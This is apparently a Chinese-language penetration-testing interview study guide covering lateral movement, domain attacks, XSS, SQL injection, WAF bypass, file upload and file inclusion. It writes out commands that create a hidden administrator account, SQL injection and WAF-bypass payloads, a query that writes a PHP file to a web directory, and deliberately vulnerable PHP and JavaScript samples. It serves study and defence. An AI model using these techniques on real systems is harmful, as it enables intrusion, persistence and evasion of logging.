<h3 id="问五十：讲一下自己的渗透经验"><a href="#问五十：讲一下自己的渗透经验" class="headerlink" title="问五十：讲一下自己的渗透经验"></a>问五十：讲一下自己的渗透经验</h3><p>查看是否存在一些高危端口，如 443 的心脏滴血，445 的永恒之蓝这两个是我知道的。如果扫到其他端口，那么可以用 metasploit 的 search  命令，去查看是否有相应的漏洞。假如说我们在内网渗透中，通过 nmap 扫到了 samba 服务，那么我们就可以去找一个最新的它的漏洞尝试攻击它。</p>
<h3 id="问五十一：如何判断网站是否有-CDN？"><a href="#问五十一：如何判断网站是否有-CDN？" class="headerlink" title="问五十一：如何判断网站是否有 CDN？"></a>问五十一：如何判断网站是否有 CDN？</h3><ul>
<li>传统访问：用户访问域名 —&gt; 解析服务器 IP—&gt; 访问目标主机</li>
<li>普通 CDN：用户访问域名 —&gt;CDN 节点 —&gt; 真实服务器 IP—&gt; 访问目标主机</li>
<li>带 WAF 的 CDN：用户访问域名 —&gt;CDN 节点（云 WAF）—&gt; 真实服务器 IP—&gt; 访问目标主机</li>
</ul>
<p>很简单，使用不同地方的 ping 服务，查看对应 IP 地址是否唯一，如果不唯一则极有可能是使用了 CDN</p>
<p>1、通过 ping 命令，查看回显情况 2、windows 系统环境下，使用 nslookup 进行查询，看返回的域名解析的情况 3、超级 ping 工具，比如”all-tool.cn/tools   /ping“「看 ip 结果」</p>
<h3 id="问五十二：如何判断靶标站点是-windows-linux？"><a href="#问五十二：如何判断靶标站点是-windows-linux？" class="headerlink" title="问五十二：如何判断靶标站点是 windows/linux？"></a>问五十二：如何判断靶标站点是 windows/linux？</h3><p>1、大小写检测：windows 大小写不敏感，而 linux 大小写敏感。 </p>
<p>2、PING 指令：根据 TTL 值，winodws 一般情况下 &gt; 100,linux&lt;100 TTL (生存时间值)：该字段指定 IP 包被路由器丢弃之前允许通过的最大网段数量。</p>
<h3 id="问五十三：如何建立隐藏用户？"><a href="#问五十三：如何建立隐藏用户？" class="headerlink" title="问五十三：如何建立隐藏用户？"></a>问五十三：如何建立隐藏用户？</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、net user <span class="built_in">test</span>$ 123456 /add [建立隐藏用户]</span><br><span class="line">2、net localgroup administrators <span class="built_in">test</span>$ /add</span><br></pre></td></tr></table></figure>
<h3 id="问五十四：正向代理和反向代理的区别？"><a href="#问五十四：正向代理和反向代理的区别？" class="headerlink" title="问五十四：正向代理和反向代理的区别？"></a>问五十四：正向代理和反向代理的区别？</h3><p>正向代理即是客户端代理，代理客户端，服务端不知道实际发起请求的客户端 反向代理即是服务端代理，代理服务端，客户端不知道实际提供服务的服务端</p>
<p>正向 Shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。 反向 Shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。 正向代理即是客户端代理，代理客户端，服务端不知道实际发起请求的客户端. 反向代理即是服务端代理，代理服务端，客户端不知道实际提供服务的服务端</p>
<h3 id="问五十五：横向渗透命令执行手段？"><a href="#问五十五：横向渗透命令执行手段？" class="headerlink" title="问五十五：横向渗透命令执行手段？"></a>问五十五：横向渗透命令执行手段？</h3><p>psexec，wmic，smbexec，winrm，net use 共享 + 计划任务 + type 命令</p>
<h3 id="问五十六：psexec-和-wmic-或者其他的区别？"><a href="#问五十六：psexec-和-wmic-或者其他的区别？" class="headerlink" title="问五十六：psexec 和 wmic 或者其他的区别？"></a>问五十六：psexec 和 wmic 或者其他的区别？</h3><p>psexec 会记录大量日志，wmic 不会记录下日志。wmic 更为隐蔽</p>
<h3 id="问五十七：域内攻击方法有了解过吗？"><a href="#问五十七：域内攻击方法有了解过吗？" class="headerlink" title="问五十七：域内攻击方法有了解过吗？"></a>问五十七：域内攻击方法有了解过吗？</h3><p>MS14-068、Roasting 攻击离线爆破密码、委派攻击，非约束性委派、基于资源的约束委派、ntlm relay</p>
<h3 id="问五十八：桌面有管理员会话，想要做会话劫持怎么做？"><a href="#问五十八：桌面有管理员会话，想要做会话劫持怎么做？" class="headerlink" title="问五十八：桌面有管理员会话，想要做会话劫持怎么做？"></a>问五十八：桌面有管理员会话，想要做会话劫持怎么做？</h3><p>提权到 system 权限，然后去通过工具，就能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证。</p>
<p>终端服务会话可以是连接状态也可以是未连接状态（这里当时没答上来，觉得有点鸡肋。我也不知道是不是这个意思）</p>
<h1 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h1><h3 id="问五十九：OWASP-Top-10"><a href="#问五十九：OWASP-Top-10" class="headerlink" title="问五十九：OWASP Top 10"></a>问五十九：OWASP Top 10</h3><p>web 十大漏洞：</p>
<p>（1）注入</p>
<p>（2）失效的身份认证和会话管理 (使用别人会话 id, 包含身份信息信用卡),</p>
<p>（3）XSS  跨站（存储、反射、dom），</p>
<p>  (4) 不安全的对象直接引用 (如？id=89 改成？id=90, 可以看到 id=90  的信息)， </p>
<p>  (5）伪造跨站请求（CSRF 可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点） </p>
<p>  (6) 安全误配置，</p>
<p>  (7) 限制  URL 访问失败（缺少功能级访问控制）,</p>
<p>  (8) 未验证的重定向和转发，</p>
<p>  (9) 应用已知脆弱性的组件，</p>
<p>  (10) 敏感信息泄露</p>
<h3 id="问六十：XSS-和-CSRF-的区别"><a href="#问六十：XSS-和-CSRF-的区别" class="headerlink" title="问六十：XSS 和 CSRF 的区别"></a>问六十：XSS 和 CSRF 的区别</h3><p>名称不同：一个为跨站请求伪造，一个为跨站脚本请求</p>
<p>危害不同：csrf 是伪造其他网站的操作，冒用身份比如利用 cookie，伪造登录凭证，无法直接窃取用户 cookie，而 xss 可以编写 payload 导致用户 cookie 直接被攻击者所窃取；</p>
<p>分类不同：xss 有三种分类，csrf 无分类；</p>
<h3 id="问六十一：XSS-是什么"><a href="#问六十一：XSS-是什么" class="headerlink" title="问六十一：XSS 是什么"></a>问六十一：XSS 是什么</h3><p>XSS 主要使用 javascript，javascript 可以非常灵活的操作 html、css 和浏览器。 </p>
<p>XSS 就是将恶意代码注入到网页中，以达到攻击的效果。</p>
<p>当用户访问被 XSS 注入的网页，XSS 代码就会被提取出来 用户浏览器就会解析这段 XSS 代码，也就是说用户被攻击了  用户最简单的动作就是使用浏览器上网，并且浏览器中有 javascript 解释器， 可以解析  javascript，然而浏览器不会判断代码是否恶意。</p>
<p>微博、留言板、聊天室等等收集用户输入的地方， 都有遭受 XSS 的风险，只要没有对用户的输入进行严格过滤，就会被 XSS 。</p>
<h3 id="问六十二：XSS-漏洞危害"><a href="#问六十二：XSS-漏洞危害" class="headerlink" title="问六十二：XSS 漏洞危害"></a>问六十二：XSS 漏洞危害</h3><ul>
<li>盗取各种用户账号 </li>
<li>窃取用户 Cookie 资料，冒充用户身份进入网站 </li>
<li>劫持用户会话，执行任意操作 </li>
<li>刷流量，执行弹窗广告 </li>
<li>传播蠕虫病毒</li>
</ul>
<h3 id="问六十三：XSS-漏洞类型"><a href="#问六十三：XSS-漏洞类型" class="headerlink" title="问六十三：XSS 漏洞类型"></a>问六十三：XSS 漏洞类型</h3><ul>
<li><p>反射型 XSS</p>
<p>搜索框，用户登录 </p>
<p>非持久性、参数跨站脚本 </p>
<p>窃取用户 cookie 或进行钓鱼欺骗</p>
</li>
<li><p>存储型 XSS</p>
<p>留言板，评论，博客日志 </p>
<p>持久性跨站脚本，更具威胁性 </p>
<p>渗透网站、挂马、蠕虫病毒、钓鱼</p>
</li>
<li><p>DOM 型 XSS</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> str = <span class="built_in">document</span>.getElementById(<span class="string">"text"</span>).value;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>).innerHTML = <span class="string">"&lt;a href='"</span>+str+<span class="string">"'&gt;testLink&lt;/a&gt;"</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"s"</span> <span class="attr">value</span>=<span class="string">"write"</span> <span class="attr">onclick</span>=<span class="string">"test()"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="问六十四：SQL-注入的本质"><a href="#问六十四：SQL-注入的本质" class="headerlink" title="问六十四：SQL 注入的本质"></a>问六十四：SQL 注入的本质</h3><p>把用户输入的数据当作代码执行。 </p>
<p>包含两个关键条件： 一：用户能够控制输入；二：原本程序要执行的代码，拼接了用户输入的数据。</p>
<h3 id="问六十五：SQL-注入经常出现的地方"><a href="#问六十五：SQL-注入经常出现的地方" class="headerlink" title="问六十五：SQL 注入经常出现的地方"></a>问六十五：SQL 注入经常出现的地方</h3><ul>
<li><p>内部实现 / 流程的角度</p>
<p>url 传参、表单 post、Cookie、User-Agent、X-Forwarded-For…</p>
</li>
<li><p>业务点</p>
<p>新闻 / 商品等查询处、用户注册 / 登陆处、修改用户资料时、找回密码处、搜索框…</p>
</li>
</ul>
<p>简言之：一切可以与数据库进行交互的地方。</p>
<h3 id="问六十六：SQL-注入的分类"><a href="#问六十六：SQL-注入的分类" class="headerlink" title="问六十六：SQL 注入的分类"></a>问六十六：SQL 注入的分类</h3><p>数字型、字符型、GRT 注入、POST 注入、cookie 注入、布尔盲注、时间盲注、延时注入、编码注入、联合查询注入、堆查询注入等</p>
<ul>
<li>根据数据的传输方式<ul>
<li>GET 类型</li>
<li>POST 类型</li>
<li>COOKIE 类型</li>
</ul>
</li>
<li>根据数据的类型<ul>
<li>数字型</li>
<li>字符型</li>
</ul>
</li>
<li>根据注入的模式<ul>
<li>基于联合查询的注入模式</li>
<li>基于报错的注入模式</li>
<li>基于布尔的盲注</li>
<li>基于时间的盲注</li>
<li>基于查询的注入模式</li>
</ul>
</li>
</ul>
<h3 id="问六十七：SQL-注入的一般步骤"><a href="#问六十七：SQL-注入的一般步骤" class="headerlink" title="问六十七：SQL 注入的一般步骤"></a><strong>问六十七：SQL 注入的一般步骤</strong></h3><ul>
<li>求闭合字符</li>
<li>选择注入模式</li>
<li>爆数据库</li>
<li>爆表名</li>
<li>爆列名</li>
<li>爆字段</li>
</ul>
<h3 id="问六十八：QL-注入绕过方式"><a href="#问六十八：QL-注入绕过方式" class="headerlink" title="问六十八：QL 注入绕过方式"></a>问六十八：QL 注入绕过方式</h3><p>大小写绕过：<code>eg：id=-1 uniOn selEct 1,2,database()</code></p>
<p>内联注释绕过：<code>eg：id=-1 union /!select/ 1,2,database()</code></p>
<p>双写关键字：<code>eg：id=-1 union seselectlect 1,2,database()</code></p>
<p>特殊编码绕过：</p>
<ol>
<li>十六进制绕过 </li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eg：UNION SELECT 1,group_concat(column_name) from</span><br><span class="line">information_schema.columns where table_name&#x3D;0x61645F6C696E6B</span><br></pre></td></tr></table></figure>
<ol>
<li>ascii 编码绕过 </li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg：Test &#x3D;CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</span><br></pre></td></tr></table></figure>
<ol>
<li>Unicode 编码</li>
</ol>
<p>常用的几个符号的一些 Unicode 编码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</span><br><span class="line">空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</span><br><span class="line">左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</span><br><span class="line">右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</span><br></pre></td></tr></table></figure>
<h3 id="问六十九：SQL-注入读写文件的根本条件"><a href="#问六十九：SQL-注入读写文件的根本条件" class="headerlink" title="问六十九：SQL 注入读写文件的根本条件"></a>问六十九：SQL 注入读写文件的根本条件</h3><p>数据库允许导入导出（secure_file_priv）</p>
<p>当前用户用户文件操作权限（File_priv）</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>secure_file_prive  参数的设置</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>secure_file_prive=null</td>
<td>限制 mysqld 不允许导入导出</td>
</tr>
<tr>
<td>secure_file_priv=/tmp/</td>
<td>限制 mysqld 的导入导出只能发 生在 /tmp/ 目录下</td>
</tr>
<tr>
<td>secure_file_priv=’ ‘</td>
<td>不对 mysqld 的导入导出做限制</td>
</tr>
</tbody>
</table>
</div>
<p>secure_file_prive 直接在 my.ini 文件里设置即可</p>
<ul>
<li>load_file () 读文件</li>
</ul>
<p>into outfile /into dumpfile 写文件</p>
<p>条件： </p>
<ul>
<li>对 web 目录具有读写权限 </li>
<li>知道文件绝对路径 </li>
<li>能够使用联合查询（sql 注入时）</li>
</ul>
<p>outfile 与 dumpfile 的区别：</p>
<ul>
<li>dumpfile 适用于二进制文件，它会将目标文件 写入同一行内，outfile 则更适用于文本文件。</li>
</ul>
<p>命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(‘d:/phpstudy/www/<span class="number">123.</span>php’); </span><br><span class="line"><span class="keyword">select</span> ‘<span class="number">123</span>’ <span class="keyword">into</span> <span class="keyword">outfile</span> ‘d:/phpstudy/www/<span class="number">123.</span>php’;</span><br></pre></td></tr></table></figure>
<h3 id="问七十：常用的报错函数有哪些"><a href="#问七十：常用的报错函数有哪些" class="headerlink" title="问七十：常用的报错函数有哪些"></a>问七十：常用的报错函数有哪些</h3><div class="table-container">
<table>
<thead>
<tr>
<th>函数名</th>
<th>函数名</th>
</tr>
</thead>
<tbody>
<tr>
<td>floor()</td>
<td>multipolygon()</td>
</tr>
<tr>
<td>updatexml()</td>
<td>linestring()</td>
</tr>
<tr>
<td>extractvalue()</td>
<td>ST_LatFromGeoHash()</td>
</tr>
<tr>
<td>exp()</td>
<td>ST_LongFromGeoHash()</td>
</tr>
<tr>
<td>GeometryCollection()</td>
<td>GTID_SUBSET()</td>
</tr>
<tr>
<td>polygon()</td>
<td>mutipoint()</td>
</tr>
<tr>
<td>GTID_SUBTRACT()</td>
<td>multionlinestring()</td>
</tr>
<tr>
<td>ST_PointFromGeoHash()</td>
</tr>
</tbody>
</table>
</div>
<p>强烈建议： 在 concat 查询语句后面添加一个标识符，如 0x23 updatexml (1,concat (0x23,payload,0x23),1) 因为有的时候报错信息会设置长度限制，添加标识符可以避免显示不完全</p>
<h3 id="问七十一：sqlmap-–os-shell-原理了解吗？"><a href="#问七十一：sqlmap-–os-shell-原理了解吗？" class="headerlink" title="问七十一：sqlmap –os-shell 原理了解吗？"></a>问七十一：sqlmap –os-shell 原理了解吗？</h3><p>sqlmap 的–os-shell 在 mysql 数据库中的原理，其实就是往服务器上写入了两个  php，其中一个给我们提供了文件上传的页面，可以通过这个上传页面上传脚本文件到当前目录下。另外一个则是返回了可以让我们执行系统命令的命令行，命令行也可以在网页 url 中通过对 cmd 参数传参执行系统命令。</p>
<h3 id="问七十二：WAF-是什么"><a href="#问七十二：WAF-是什么" class="headerlink" title="问七十二：WAF 是什么"></a>问七十二：WAF 是什么</h3><p>WAF 设备：绿盟 / 深信服 / 启明星辰 / 360 / 阿里云 WAF / 安全狗等</p>
<p>WAF 通过一组通常称为策略的规则运行。这些策略旨在通过过滤掉恶意流量来防止应用程序中的漏洞。WAF 的价值部分来自于实施策略修改的速度和便利性，从而可以更快地响应不同的攻击向量；在 DDoS 攻击期间，可以通过修改 WAF 策略快速实现限速。</p>
<p><strong> 三种 WAF </strong> 实现基于网络的 WAF 通常是基于硬件的。</p>
<ul>
<li><p>由于它们是在本地安装的，因此可以最大限度地减少延迟，但基于网络的 WAF 是最昂贵的选择，并且还需要存储和维护物理设备。  </p>
<p>代表产品有：Imperva、天清 WAG 等。</p>
</li>
<li><p>基于主机的 WAF 可以完全集成到应用程序的软件中。</p>
<p>此解决方案比基于网络的 WAF 更便宜，并且提供更多的可定制性。基于主机的 WAF 的缺点是消耗本地服务器资源、实施复杂性和维护成本，这些组件通常需要占用大量资源和时间。</p>
<p>代表产品：安全狗，云锁，D 盾等。  </p>
</li>
<li><p>基于云的 WAF 是一种云防火墙。</p>
<p>他们通常提供交钥匙安装，就像更改 DNS 以重定向流量一样简单。基于云的 WAF 还具有最低的前期成本，因为用户每月或每年为安全即服务付费。基于云的 WAF  还可以提供持续更新的解决方案，以抵御最新的威胁，而无需在用户端进行任何额外的工作或成本。基于云的 WAF 的缺点是用户将责任移交给第三方，因此  WAF 的某些功能对用户来说可能是一个黑匣子。  </p>
<p>代表产品有：阿里云云盾，腾讯云 WAF 等。</p>
</li>
</ul>
<h3 id="问七十三：WAF-的工作原理？"><a href="#问七十三：WAF-的工作原理？" class="headerlink" title="问七十三：WAF 的工作原理？"></a>问七十三：WAF 的工作原理？</h3><p>WAF 的处理流程大致可分为四部分：预处理、规则检测、处理模块、日志记录</p>
<ul>
<li><p>预处理</p>
<p>预处理阶段首先在接收到数据请求流量时会先判断是否为 HTTP/HTTPS 请求，之后会查看此 URL 请求是否在白名单之内，如果该 URL 请求在白名单列表里，直接交给后端 Web 服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。</p>
</li>
<li><p>规则检测</p>
<p>每一种 WAF 产品都有自己独特的检测规则体系，解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。</p>
</li>
<li><p>处理模块</p>
<p>针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端 Web 服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。不同的 WAF  产品会自定义不同的拦截警告页面，在日常渗透中我们也可以根据不同的拦截页面来辨别出网站使用了哪款 WAF 产品，从而有目的性的进行 WAF 绕过。</p>
</li>
<li><p>日志记录</p>
<p>WAF 在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。</p>
</li>
</ul>
<h3 id="问七十四：绕-WAF-的多种方式"><a href="#问七十四：绕-WAF-的多种方式" class="headerlink" title="问七十四：绕 WAF 的多种方式"></a>问七十四：绕 WAF 的多种方式</h3><ul>
<li><p>字母大小写混合绕过</p>
<p>原因：服务器端检测时未开启大小写不敏感</p>
<p>形式：<code>UnIon SeLecT</code></p>
</li>
<li><p>多重关键字</p>
<p>原因：服务器端检测到敏感字符时替换为空 </p>
<p>形式：<code>ununionion selselectect</code></p>
</li>
<li><p>注释</p>
<p>原因：服务器端未检测或检测不严注释内的字符串 </p>
<p>形式：<code>/**/，/*!*/，/*!12345*/，#，-- -</code> 等</p>
</li>
<li><p>编码绕过</p>
<p>原因：服务器端未检测或检测不严具有编码形式的关键字 </p>
<p>类型：十六进制编码、URL 编码、Unicode 编码 </p>
<p>形式：<code>0x61646d696e、%20、%u0020</code></p>
</li>
<li><p>等价函数或命令</p>
<p>原因：服务器端黑名单不完整，过滤不严 </p>
<p>形式： </p>
<p>Mysql 查询：<code>Union distinct、updatexml、Extractvalue、floor</code> </p>
<p>字符串截取函数：<code>mid、substr、substring、left、reverse</code></p>
<p>字符串连接函数：<code>concat、group_concat、concat_ws</code></p>
<p>字符串转换：<code>char、hex、unhex</code> </p>
<p>替换逗号：<code>limit 1 offset 0，mid(version() from 1 for 1)</code></p>
<p>替换等号：<code>like</code></p>
</li>
<li><p>组合绕过</p>
<p>原因：服务器端检测多处位置，需要多重绕过方式组合使用 </p>
<p>形式：<code>id = 1’ and/**/’1’like’2’/**//*!12345union*/select 1,2,3</code></p>
</li>
<li><p>特殊字符</p>
<p>原因：数据库中效果相同，服务器端却没有限制 </p>
<p>形式：</p>
<p>科学记数法 <code>and 1e0 = 1e0</code></p>
<p>空白字符 <code>%0a %a0 %0b %20 %09</code></p>
<p>反单引号 <code>table_name</code> </p>
<p>括号 <code>select * from (test.admin)</code></p>
</li>
</ul>
<h3 id="问七十五：文件上传"><a href="#问七十五：文件上传" class="headerlink" title="问七十五：文件上传"></a>问七十五：文件上传</h3><p>Web 应用程序通常会有文件上传的功能， 比如：在 BBS 发布图片、在个人网站上传头像、在招聘网站上发布个人的 DOCX 格式的简历等。只要是  Web 应用 程序允许上传文件，就有可能会有文件上传漏洞。 上传漏洞与其他漏洞相比风险很大，如果 Web 应用程序存在  上传漏洞，攻击者可以直接上传一个 Webshell 到服务器上， 这是相当危险的。</p>
<h3 id="问七十六：文件上传后遇到重定向怎么办"><a href="#问七十六：文件上传后遇到重定向怎么办" class="headerlink" title="问七十六：文件上传后遇到重定向怎么办"></a>问七十六：文件上传后遇到重定向怎么办</h3><p>这个问题说实话我没遇到过，也是学到了有可能会有这种防御手段；这其实就是网站为了防止文件上传攻击做出的防御手段，致使我们上传文件后直接跳转到其他网页</p>
<p>修改前端</p>
<p>绕过方法：前端页面 form 表单中 button 按钮默认类型 submit，修改为 button 可解决此问题</p>
<p>例如：将提交文件的 form 表单在浏览器控制台中中修改为 input 即可绕过</p>
<p>修改后端</p>
<p>如果是返回数据包中找不到 webshell 的路径无法连接，那就需要进行下一步，是否能跨目录传 shell，上传的 shell 没路径，是否可以通过信息收集找到 shell 路径，传 oss</p>
<h3 id="问七十七：文件上传绕过方法"><a href="#问七十七：文件上传绕过方法" class="headerlink" title="问七十七：文件上传绕过方法"></a>问七十七：文件上传绕过方法</h3><ul>
<li><p>关于文件上传其实打过 upload 的哪个靶场久很清楚了</p>
<ul>
<li>上传的 shell 不被解析怎么办：尝试文件包含</li>
<li>服务器端文件名拓展检测 - 绕过方法</li>
<li>文件名大小写绕过（AsP, pHp 等等）</li>
</ul>
</li>
<li><p>黑白名单绕过（php、php2、php3、php5、phtml、asp、aspx、 ascx、ashx、cer、asa、jsp、jspx）</p>
</li>
<li><p>特殊文件名绕过</p>
</li>
<li><p>修改数据包里的文件名改为 test.php. 或者 test.asp_ (下划线是空格) 由于这种命名格式在 windows 系统里是不允许的。所以在绕过上传之 后 windows 系统会自动去掉 点和空格。Unix/Linux 系统没有这个特 性。</p>
</li>
<li><p>0x00 截断绕过，解析漏洞</p>
<p>就是在 url 后面输入 %00</p>
<p>条件： allow_url_fopen = Off php 版本 &lt; 5.3.4 </p>
</li>
</ul>
<h3 id="问七十八：文件包含"><a href="#问七十八：文件包含" class="headerlink" title="问七十八：文件包含"></a>问七十八：文件包含</h3><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函 数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件 包含。服务器执行 PHP 文件时，可以通过包含函数加载另一个文件中的  PHP 代码， 并且当 PHP 来执行，这会为开发者节省大量的时间。</p>
<p><strong>产生漏洞的原因</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $var = $GET[<span class="string">'page'</span>];</span><br><span class="line">    <span class="keyword">include</span>($var . <span class="string">".html"</span>);</span><br></pre></td></tr></table></figure>
<p>这是一段 PHP 代码，从代码上分析可以看出， 把一个 GET 请求的参数 “page” 传给了一个变 量  filename，然后包含了这个变量。然而，开发者没有对 $_GET [‘page’] 参数经过严格的过滤。直接带入了 include  的函数，我们可以修改 $_GET [‘page’] 的值，包含自己想看的文件。 （文件的路径一定要对，不对的话就包含不了）</p>
<p>这样，我们总结一下，文件包含漏洞就是： 程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变  量，用来进行动态调用，文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意  文件，导致了执行了非预期的代码。从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p>
<h3 id="问七十九：包含函数有那些"><a href="#问七十九：包含函数有那些" class="headerlink" title="问七十九：包含函数有那些"></a>问七十九：包含函数<em>有那些</em></h3><p>PHP 中文件包含函数有以下四种：</p>
<ul>
<li>require () 只要程序一运行就包含文件，找不到被包含的文件时会产生致命 错误，并停止脚本</li>
<li>require_once ()  若文件中代码已被包含则不会再次包含</li>
<li>include () 执行到 include 时才包含文件，找不到被包含文件时只会产生警告， 脚本将继续执行</li>
<li>include_once () 若文件中代码已被包含则不会再次包含</li>
</ul>
<h3 id="问八十：文件包含漏洞利用条件"><a href="#问八十：文件包含漏洞利用条件" class="headerlink" title="问八十：文件包含漏洞利用条件"></a>问八十：文件包含漏洞利用条件</h3><ul>
<li>程序用 include () 等文件包含函数通过动态变量的范式引入需要包含的文件 </li>
<li>用户能够控制该动态变量 </li>
<li>要保证 php.ini 中 allow_url_fopen 和 allow_url_include 要为 On</li>
</ul>
<h3 id="问八十一：文件包含漏洞的分类"><a href="#问八十一：文件包含漏洞的分类" class="headerlink" title="问八十一：文件包含漏洞的分类"></a>问八十一：文件包含漏洞的分类</h3><ul>
<li><p>本地包含</p>
<p>可以包含本地文件，在条件允许时甚至能执行代码 读敏感文件，读 PHP 文件包含日志文件 GetShell 包含 data: 或 php://input 等伪协议 若有 phpinfo 则可以包含临时文件 配合上传图片马，然后包含从而 GetShell</p>
</li>
<li><p>远程包含</p>
<p>包含远程的木马或病毒文件，从而 GetShell</p>
</li>
</ul>
<p>注意：要实现远程文件包含需要 allow_url_fopen 和 allow_url_include 都开启</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $var = $GET[<span class="string">'page'</span>];</span><br><span class="line">    <span class="keyword">include</span>($var . <span class="string">".html"</span>);</span><br></pre></td></tr></table></figure>
<p>在包含变量 $var 时，限制了只允许包含 “.html”  格式的文件，这就阻止了一些非法的包含其他文件的情况。</p>
<h3 id="问八十二：文件包含绕过限制"><a href="#问八十二：文件包含绕过限制" class="headerlink" title="问八十二：文件包含绕过限制"></a>问八十二：文件包含绕过限制</h3><p>绕过后面的 “. Html” 限制有很多方法可以实现</p>
<ol>
<li><p>%00 截断</p>
<p>就是在 url 后面输入 %00</p>
<p>条件： allow_url_fopen = Off php 版本 &lt; 5.3.4</p>
</li>
<li><p>长路径截断 </p>
<p>条件：windows OS，点号需要长于 256；linux OS 长于 4096 windows 下目录最大长度为 256 字节，超出的部分会被丢 弃 linux 下目录最大长度为 4096 字节</p>
</li>
<li><p>点点点点点号绕过</p>
<p>点号绕过的原理和长路径截断的一样： 原理是： windows 下目录最大长度为 256 字节， 超出的部分会被丢弃 linux 下目录最大长度为 4096 字节，  超出的部分会被丢弃 所以用….. 绕过的时候 windows 系统 中，点号需要长于 256 ；linux 系统 中点号要长于 4096</p>
</li>
</ol>
<h3 id="问八十三：开启包含功能的条件"><a href="#问八十三：开启包含功能的条件" class="headerlink" title="问八十三：开启包含功能的条件"></a>问八十三：开启包含功能的条件</h3><p>想要开启文件包含的 功能， 首先要修改 PHP 的配置 文件（PHP.ini）把文件里的功能选项开启。</p>
<p>在 Linux 中 PHP.ini 配置文件一般默认安装 在 /etc 目 录 下 。 下面是 两 个 功 能选项 ： </p>
<ul>
<li><p>allow_url_fopen ：</p>
<p>on 默认 开 启 该选项 为 on 便 是 激活了 URL 形式 的 fopen 封装协议使得可以访问 URL 对 象文件等。</p>
</li>
<li><p>allow_url_include ：</p>
<p>off 默认关闭，该选项 为 on 便 是允许 包含 URL 对 象文件等</p>
</li>
</ul>
<h3 id="问八十四：自己有没有实操过文件上传配合文件包含漏洞？"><a href="#问八十四：自己有没有实操过文件上传配合文件包含漏洞？" class="headerlink" title="问八十四：自己有没有实操过文件上传配合文件包含漏洞？"></a>问八十四：自己有没有实操过文件上传配合文件包含漏洞？</h3><p>发现一个上传文件页面，但只能上传图片。</p>
<p>我们可以利用火狐来绕过限制，首先设置浏览器的代理为 127.0.0.1 端口为 8080，然后打开 burp suite 工具待用 ，然后再次上传我们的木马文件，这时候 burp suite  工具会闪烁， 我们进入 burp suite ，发现找到了我们 刚刚发送的数据包，接下来我们需要修改一下文件格式这一选项， 把它的格式改为  image/jpeg，我们这么做的目的为了是欺骗一下服务器端的验证，让它以为是这是一个图片格式 的文件。我们点击一下 Forward ,  把它放过 然后切换到浏览器，我们发现文件上传成功了。</p>
